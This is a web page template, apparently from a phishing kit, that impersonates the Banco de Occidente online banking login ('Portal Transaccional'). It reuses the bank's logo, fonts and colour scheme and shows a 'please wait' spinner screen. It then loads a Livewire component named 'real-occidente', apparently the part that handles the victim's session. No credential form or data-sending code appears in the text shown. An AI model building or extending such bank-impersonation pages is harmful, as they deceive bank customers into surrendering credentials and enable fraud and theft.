<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso al Portal Transaccional | Banco de Occidente</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <style>
        @font-face {
            font-family: Poppins;
            src: url(/occidente/Poppins-Bold.ttf) format("truetype");
            font-style: normal;
            font-weight: 700;
        }

        @font-face {
            font-family: Poppins;
            src: url(/occidente/Poppins-SemiBold.ttf) format("truetype");
            font-style: normal;
            font-weight: 600;
        }

        @font-face {
            font-family: Poppins;
            src: url(/occidente/Poppins-Medium.ttf) format("truetype");
            font-style: normal;
            font-weight: 500;
        }



        .texto-1 {


            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin-top: 0;
            font-weight: 400;
            font-size: 16px;
            line-height: 2.286rem;
            letter-spacing: 0;
            color: var(--vds-carbon-dark-1000);
            margin-bottom: 32px;



        }

        .entrada-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            font-family: inherit;
            overflow: visible;
            border: 1px solid var(--vds-n-lighter-300);
            border-radius: 4px;
            color: var(--vds-carbon-light-700);
            outline: none;
            font-weight: 500;
            font-size: 1rem;
            text-align: left;
            line-height: 1.571rem;
            letter-spacing: 0;
            padding: 8px;
            width: 100%;
        }

        .boton-1 {

            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            font-family: inherit;
            overflow: visible;
            text-transform: none;
            vertical-align: middle;
            user-select: none;
            background-color: transparent;
            transition: none;
            position: relative;
            border-radius: 4px;
            font-size: 1em;
            font-weight: 600;
            line-height: 1;
            letter-spacing: normal;
            padding: .85rem 1rem;
            color: var(--vds-neutral-lighter-50);
            background-image: linear-gradient(to bottom, var(--vds-primary-700-base), var(--vds-primary-900) 72%);
            border: none;
            /* width: 110px; */
            height: 50px;
            cursor: pointer;
            /* margin-right: 0; */


        }

        .label-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            display: inline-block;
            font-weight: 600;
            font-size: .857rem;
            text-align: left;
            line-height: 1rem;
            letter-spacing: 0;
            margin-bottom: 4px;
            padding: 2px 0 0;
            color: var(--vds-carbon-light-700);
        }

        .select-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-size: 1rem;
            line-height: 1.5;
            color: #212529;
            text-align: left;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            font-weight: 400;
            display: block;
            position: relative;
            box-sizing: border-box;
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            visibility: inherit;
            --vds-primary-900: #0056cb;
            --vds-primary-700-base: #0081ff;
            --vds-primary-400: #56b0ff;
            --vds-primary-100: #e2f1ff;
            --vds-primary-shade-900: #022047;
            --vds-primary-shade-700-base: #00246f;
            --vds-primary-shade-400: #6d84bf;
            --vds-primary-shade-100: #e6e9f4;
            --vds-secondary-900: #7e5a23;
            --vds-secondary-700-base: #dca85e;
            --vds-secondary-400: #e6c089;
            --vds-secondary-100: #f8f0e2;
            --vds-accent-900: #4600e9;
            --vds-accent-700-base: #9240fe;
            --vds-accent-400: #a869ff;
            --vds-accent-100: #f2e6ff;
            --vds-carbon-dark-1000: #1b1c1e;
            --vds-carbon-dark-900: #333;
            --vds-n-darker-700: #898d95;
            --vds-n-darker-600: #cdcdcd;
            --vds-carbon-light-900: #55616f;
            --vds-carbon-light-700: #555f83;
            --vds-n-lighter-300: #adbae6;
            --vds-n-lighter-100: #f3f6fe;
            --vds-neutral-lighter-50: #fff;
            --vds-error-900: #981b1f;
            --vds-error-700-base: #e24c4c;
            --vds-error-400: #da6d6e;
            --vds-error-100: #fdeaed;
            --vds-warning-900: #b75f0e;
            --vds-warning-700-base: #ffaa31;
            --vds-warning-400: #ffcd84;
            --vds-warning-100: #fff3e1;
            --vds-success-900: #117847;
            --vds-success-700-base: #00ca82;
            --vds-success-400: #86e0b7;
            --vds-success-100: #e2f8ed;
            --vds-semantic-info-900: #2e4783;
            --vds-info-700: #3187ff;
            --vds-info-400: #43a5ff;
            --vds-info-100: #e3f2ff;
            --vds-tuplus-200: #a2efe1;
            --vds-tuplus-700: #07a5b2;
            --vds-product-black-400: #53575d;
            --vds-product-black-700: #1a1c1f;
            --vds-product-silver-200: #f0f0f0;
            --vds-product-silver-400: #989898;
            --vds-product-gold-200: #e7d689;
            --vds-product-gold-700: #ada377;
            --vds-product-bronze-200: #c1976a;
            --vds-product-bronze-700: #8d643c;
            --vds-product-regular-400: #0063dc;
            --vds-product-regular-700: #012e65;
            --vds-product-infinitive-400: #3071b7;
            --vds-product-infinitive-700: #0c1b2b;
            --vds-product-traveler-200: #ffce9d;
            --vds-product-traveler-700: #d63535;
            --vds-n-lighter-200: #dfe5f9;
            --vds-product-unicef-200: #b5ebfb;
            --vds-product-unicef-400: #00b9f2;
            --vds-product-mascotas-400: #00a0d2;
            --vds-product-mascotas-700: #022847;
            --vds-preferente-400: #013676;
            --vds-preferente-900: #001d40;
            --vds-elite-400: #00244f;
            --vds-elite-700: #001227;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --primary: #007bff;
            --secondary: #6c757d;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f8f9fa;
            --dark: #343a40;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-family: Poppins, serif;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            background-color: #fff;
            border-radius: 4px;
            min-height: 36px;
            align-items: center;
            border: 1px solid var(--vds-n-lighter-300);
            color: var(--vds-carbon-light-700) !important;
            cursor: default;
            display: flex;
            outline: none;
            overflow: hidden;
            position: relative;
            width: 100%;
            height: 40px;
            font-weight: 500;
            font-size: 1rem;
            text-align: left;
            line-height: 1.571rem;
            letter-spacing: 0;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                /* Ancho del cuerpo en dispositivos de escritorio */
                margin: 0 auto;
                /* Centra el cuerpo horizontalmente */
            }
        }
    </style>

</head>

<body>
<x-lab-banner />
    <div class="text-center py-4">
        <img src="/occidente/logo_occidente.svg" width="168" height="40" alt="">
    </div>
    <br>
    <br>
    <div class="text-center py-4">
        <img src="/occidente/spinner-occi.gif" width="100" height="100" alt="">
    </div>
    <div class="text-center">
        <p class="texto-1">Espere un momento por favor.</p>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
    <div>
        @livewire('real-occidente')
    </div>
    @livewireScripts

</body>

</html>